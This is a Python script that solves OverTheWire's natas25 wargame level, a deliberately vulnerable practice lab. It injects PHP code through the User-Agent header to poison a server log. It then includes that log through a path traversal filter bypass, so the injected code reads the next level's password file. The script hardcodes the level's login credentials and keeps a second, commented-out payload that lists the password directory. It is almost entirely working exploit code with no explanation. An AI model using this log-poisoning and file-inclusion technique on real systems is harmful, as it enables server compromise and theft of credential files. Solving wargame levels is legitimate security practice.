import requests

URL = "http://natas25.natas.labs.overthewire.org/"
CREDS = ("natas25", "GHF6X7YwACaYYssHVY05cFq83hRktl4c")
#USER_AGENT = "<?php var_dump( listFiles('/etc/natas_webpass/'));?>"
USER_AGENT = "<?php var_dump( file_get_contents('/etc/natas_webpass/natas26'));?>"

s = requests.Session()
s.auth = CREDS
s.headers = {'User-Agent': USER_AGENT}

cookie = s.get(URL).cookies["PHPSESSID"]

hack_url = URL + "?lang=..././logs/natas25_" + cookie + ".log"

print(s.get(hack_url).text)
